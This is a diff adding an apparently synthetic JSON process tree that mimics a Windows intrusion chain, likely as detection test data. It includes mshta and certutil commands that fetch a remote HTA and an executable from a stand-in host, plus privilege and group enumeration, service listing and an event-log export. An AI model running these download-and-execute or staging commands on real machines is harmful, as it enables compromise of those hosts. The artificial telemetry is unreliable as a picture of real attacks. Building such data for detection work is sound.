@@ -1,0 +1,358 @@
+{
+  "pid": 342532,
+  "ppid": 0,
+  "name": "powershell.exe",
+  "command": "powershell.exe -NoProfile -File \"C:\\IT\\Deploy\\Runbook_e1c0e1ca.ps1\"",
+  "children": [
+    {
+      "pid": 342538,
+      "ppid": 342532,
+      "name": "cmd.exe",
+      "command": "cmd.exe /c \"hostname\"",
+      "children": [
+        {
+          "pid": 342541,
+          "ppid": 342538,
+          "name": "mshta.exe",
+          "command": "mshta.exe \"http://support.wingtipsoft.com/pkg/postreg.hta\"",
+          "children": [
+            {
+              "pid": 342542,
+              "ppid": 342541,
+              "name": "powershell.exe",
+              "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 23\"",
+              "children": [
+                {
+                  "pid": 342546,
+                  "ppid": 342542,
+                  "name": "hostname.exe",
+                  "command": "hostname.exe",
+                  "children": [
+                    {
+                      "pid": 342550,
+                      "ppid": 342546,
+                      "name": "hostname.exe",
+                      "command": "hostname.exe > \"C:\\Users\\isha.menon\\AppData\\Local\\Temp\\host_2d2c1b29.txt\"",
+                      "children": [
+                        {
+                          "pid": 342553,
+                          "ppid": 342550,
+                          "name": "certutil.exe",
+                          "command": "certutil.exe -urlcache -split -f \"http://support.wingtipsoft.com/tools/runner.exe\" \"C:\\Users\\isha.menon\\AppData\\Local\\Temp\\relay.bin\"",
+                          "children": [
+                            {
+                              "pid": 342560,
+                              "ppid": 342553,
+                              "name": "choice.exe",
+                              "command": "choice.exe /d y /t 25 > nul",
+                              "children": [
+                                {
+                                  "pid": 342564,
+                                  "ppid": 342560,
+                                  "name": "hostname.exe",
+                                  "command": "hostname.exe > \"C:\\Users\\isha.menon\\AppData\\Local\\Temp\\host_4889f08f.txt\"",
+                                  "children": [
+                                    {
+                                      "pid": 342571,
+                                      "ppid": 342564,
+                                      "name": "ping.exe",
+                                      "command": "ping.exe -n 18 127.0.0.1 > nul",
+                                      "children": []
+                                    }
+                                  ]
+                                }
+                              ]
+                            },
+                            {
+                              "pid": 342573,
+                              "ppid": 342553,
+                              "name": "choice.exe",
+                              "command": "choice.exe /d y /t 5 > nul",
+                              "children": [
+                                {
+                                  "pid": 342577,
+                                  "ppid": 342573,
+                                  "name": "powershell.exe",
+                                  "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 7\"",
+                                  "children": [
+                                    {
+                                      "pid": 342583,
+                                      "ppid": 342577,
+                                      "name": "choice.exe",
+                                      "command": "choice.exe /d y /t 6 > nul",
+                                      "children": [
+                                        {
+                                          "pid": 342586,
+                                          "ppid": 342583,
+                                          "name": "tasklist.exe",
+                                          "command": "tasklist.exe /svc",
+                                          "children": [
+                                            {
+                                              "pid": 342591,
+                                              "ppid": 342586,
+                                              "name": "ping.exe",
+                                              "command": "ping.exe -n 26 127.0.0.1 > nul",
+                                              "children": [
+                                                {
+                                                  "pid": 342592,
+                                                  "ppid": 342591,
+                                                  "name": "choice.exe",
+                                                  "command": "choice.exe /d y /t 5 > nul",
+                                                  "children": [
+                                                    {
+                                                      "pid": 342598,
+                                                      "ppid": 342592,
+                                                      "name": "powershell.exe",
+                                                      "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Process -FilePath 'whoami.exe' -ArgumentList '/priv' -Wait\"",
+                                                      "children": [
+                                                        {
+                                                          "pid": 342601,
+                                                          "ppid": 342598,
+                                                          "name": "wevtutil.exe",
+                                                          "command": "wevtutil.exe epl \"Application\" \"C:\\ProgramData\\Alpine\\Logs\\Application_6571ab0b.evtx\"",
+                                                          "children": [
+                                                            {
+                                                              "pid": 342602,
+                                                              "ppid": 342601,
+                                                              "name": "ping.exe",
+                                                              "command": "ping.exe -n 24 127.0.0.1 > nul",
+                                                              "children": [
+                                                                {
+                                                                  "pid": 342608,
+                                                                  "ppid": 342602,
+                                                                  "name": "hostname.exe",
+                                                                  "command": "hostname.exe",
+                                                                  "children": [
+                                                                    {
+                                                                      "pid": 342614,
+                                                                      "ppid": 342608,
+                                                                      "name": "hostname.exe",
+                                                                      "command": "hostname.exe",
+                                                                      "children": [
+                                                                        {
+                                                                          "pid": 342618,
+                                                                          "ppid": 342614,
+                                                                          "name": "cmd.exe",
+                                                                          "command": "cmd.exe /c \"makecab.exe \"C:\\ProgramData\\Fabrikam\\Logs\\diag.txt\" \"C:\\ProgramData\\Fabrikam\\Logs\\diag.cab\"\"",
+                                                                          "children": [
+                                                                            {
+                                                                              "pid": 342619,
+                                                                              "ppid": 342618,
+                                                                              "name": "timeout.exe",
+                                                                              "command": "timeout.exe /t 18 /nobreak",
+                                                                              "children": [
+                                                                                {
+                                                                                  "pid": 342624,
+                                                                                  "ppid": 342619,
+                                                                                  "name": "whoami.exe",
+                                                                                  "command": "whoami.exe /priv > \"C:\\Users\\isha.menon\\AppData\\Local\\Temp\\who_07f1478f.txt\"",
+                                                                                  "children": [
+                                                                                    {
+                                                                                      "pid": 342630,
+                                                                                      "ppid": 342624,
+                                                                                      "name": "powershell.exe",
+                                                                                      "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 24\"",
+                                                                                      "children": [
+                                                                                        {
+                                                                                          "pid": 342632,
+                                                                                          "ppid": 342630,
+                                                                                          "name": "hostname.exe",
+                                                                                          "command": "hostname.exe > \"C:\\Users\\isha.menon\\AppData\\Local\\Temp\\host_f71a9037.txt\"",
+                                                                                          "children": [
+                                                                                            {
+                                                                                              "pid": 342639,
+                                                                                              "ppid": 342632,
+                                                                                              "name": "whoami.exe",
+                                                                                              "command": "whoami.exe /groups > \"C:\\Users\\isha.menon\\AppData\\Local\\Temp\\who_2324567d.txt\"",
+                                                                                              "children": [
+                                                                                                {
+                                                                                                  "pid": 342640,
+                                                                                                  "ppid": 342639,
+                                                                                                  "name": "powershell.exe",
+                                                                                                  "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 20\"",
+                                                                                                  "children": [
+                                                                                                    {
+                                                                                                      "pid": 342641,
+                                                                                                      "ppid": 342640,
+                                                                                                      "name": "hostname.exe",
+                                                                                                      "command": "hostname.exe > \"C:\\Users\\isha.menon\\AppData\\Local\\Temp\\host_0f2a2989.txt\"",
+                                                                                                      "children": [
+                                                                                                        {
+                                                                                                          "pid": 342647,
+                                                                                                          "ppid": 342641,
+                                                                                                          "name": "hostname.exe",
+                                                                                                          "command": "hostname.exe",
+                                                                                                          "children": [
+                                                                                                            {
+                                                                                                              "pid": 342653,
+                                                                                                              "ppid": 342647,
+                                                                                                              "name": "hostname.exe",
+                                                                                                              "command": "hostname.exe",
+                                                                                                              "children": [
+                                                                                                                {
+                                                                                                                  "pid": 342654,
+                                                                                                                  "ppid": 342653,
+                                                                                                                  "name": "whoami.exe",
+                                                                                                                  "command": "whoami.exe /priv > \"C:\\Users\\isha.menon\\AppData\\Local\\Temp\\who_0d7446f7.txt\"",
+                                                                                                                  "children": [
+                                                                                                                    {
+                                                                                                                      "pid": 342661,
+                                                                                                                      "ppid": 342654,
+                                                                                                                      "name": "cmd.exe",
+                                                                                                                      "command": "cmd.exe /c \"whoami.exe /groups\"",
+                                                                                                                      "children": [
+                                                                                                                        {
+                                                                                                                          "pid": 342665,
+                                                                                                                          "ppid": 342661,
+                                                                                                                          "name": "ping.exe",
+                                                                                                                          "command": "ping.exe -n 6 127.0.0.1 > nul",
+                                                                                                                          "children": [
+                                                                                                                            {
+                                                                                                                              "pid": 342668,
+                                                                                                                              "ppid": 342665,
+                                                                                                                              "name": "choice.exe",
+                                                                                                                              "command": "choice.exe /d y /t 6 > nul",
+                                                                                                                              "children": [
+                                                                                                                                {
+                                                                                                                                  "pid": 342672,
+                                                                                                                                  "ppid": 342668,
+                                                                                                                                  "name": "hostname.exe",
+                                                                                                                                  "command": "hostname.exe > \"C:\\Users\\isha.menon\\AppData\\Local\\Temp\\host_908adf89.txt\"",
+                                                                                                                                  "children": [
+                                                                                                                                    {
+                                                                                                                                      "pid": 342674,
+                                                                                                                                      "ppid": 342672,
+                                                                                                                                      "name": "ping.exe",
+                                                                                                                                      "command": "ping.exe -n 13 127.0.0.1 > nul",
+                                                                                                                                      "children": [
+                                                                                                                                        {
+                                                                                                                                          "pid": 342677,
+                                                                                                                                          "ppid": 342674,
+                                                                                                                                          "name": "whoami.exe",
+                                                                                                                                          "command": "whoami.exe",
+                                                                                                                                          "children": [
+                                                                                                                                            {
+                                                                                                                                              "pid": 342678,
+                                                                                                                                              "ppid": 342677,
+                                                                                                                                              "name": "powershell.exe",
+                                                                                                                                              "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 6\"",
+                                                                                                                                              "children": [
+                                                                                                                                                {
+                                                                                                                                                  "pid": 342685,
+                                                                                                                                                  "ppid": 342678,
+                                                                                                                                                  "name": "whoami.exe",
+                                                                                                                                                  "command": "whoami.exe > \"C:\\Users\\isha.menon\\AppData\\Local\\Temp\\who_40d56a54.txt\"",
+                                                                                                                                                  "children": [
+                                                                                                                                                    {
+                                                                                                                                                      "pid": 342687,
+                                                                                                                                                      "ppid": 342685,
+                                                                                                                                                      "name": "hostname.exe",
+                                                                                                                                                      "command": "hostname.exe",
+                                                                                                                                                      "children": [
+                                                                                                                                                        {
+                                                                                                                                                          "pid": 342691,
+                                                                                                                                                          "ppid": 342687,
+                                                                                                                                                          "name": "hostname.exe",
+                                                                                                                                                          "command": "hostname.exe",
+                                                                                                                                                          "children": [
+                                                                                                                                                            {
+                                                                                                                                                              "pid": 342692,
+                                                                                                                                                              "ppid": 342691,
+                                                                                                                                                              "name": "whoami.exe",
+                                                                                                                                                              "command": "whoami.exe /priv > \"C:\\Users\\isha.menon\\AppData\\Local\\Temp\\who_2cf6d0eb.txt\"",
+                                                                                                                                                              "children": [
+                                                                                                                                                                {
+                                                                                                                                                                  "pid": 342694,
+                                                                                                                                                                  "ppid": 342692,
+                                                                                                                                                                  "name": "ping.exe",
+                                                                                                                                                                  "command": "ping.exe -n 4 127.0.0.1 > nul",
+                                                                                                                                                                  "children": [
+                                                                                                                                                                    {
+                                                                                                                                                                      "pid": 342700,
+                                                                                                                                                                      "ppid": 342694,
+                                                                                                                                                                      "name": "hostname.exe",
+                                                                                                                                                                      "command": "hostname.exe > \"C:\\Users\\isha.menon\\AppData\\Local\\Temp\\host_e4a143b2.txt\"",
+                                                                                                                                                                      "children": []
+                                                                                                                                                                    }
+                                                                                                                                                                  ]
+                                                                                                                                                                }
+                                                                                                                                                              ]
+                                                                                                                                                            }
+                                                                                                                                                          ]
+                                                                                                                                                        }
+                                                                                                                                                      ]
+                                                                                                                                                    }
+                                                                                                                                                  ]
+                                                                                                                                                }
+                                                                                                                                              ]
+                                                                                                                                            }
+                                                                                                                                          ]
+                                                                                                                                        }
+                                                                                                                                      ]
+                                                                                                                                    }
+                                                                                                                                  ]
+                                                                                                                                }
+                                                                                                                              ]
+                                                                                                                            }
+                                                                                                                          ]
+                                                                                                                        }
+                                                                                                                      ]
+                                                                                                                    }
+                                                                                                                  ]
+                                                                                                                }
+                                                                                                              ]
+                                                                                                            }
+                                                                                                          ]
+                                                                                                        }
+                                                                                                      ]
+                                                                                                    }
+                                                                                                  ]
+                                                                                                }
+                                                                                              ]
+                                                                                            }
+                                                                                          ]
+                                                                                        }
+                                                                                      ]
+                                                                                    }
+                                                                                  ]
+                                                                                }
+                                                                              ]
+                                                                            }
+                                                                          ]
+                                                                        }
+                                                                      ]
+                                                                    }
+                                                                  ]
+                                                                }
+                                                              ]
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
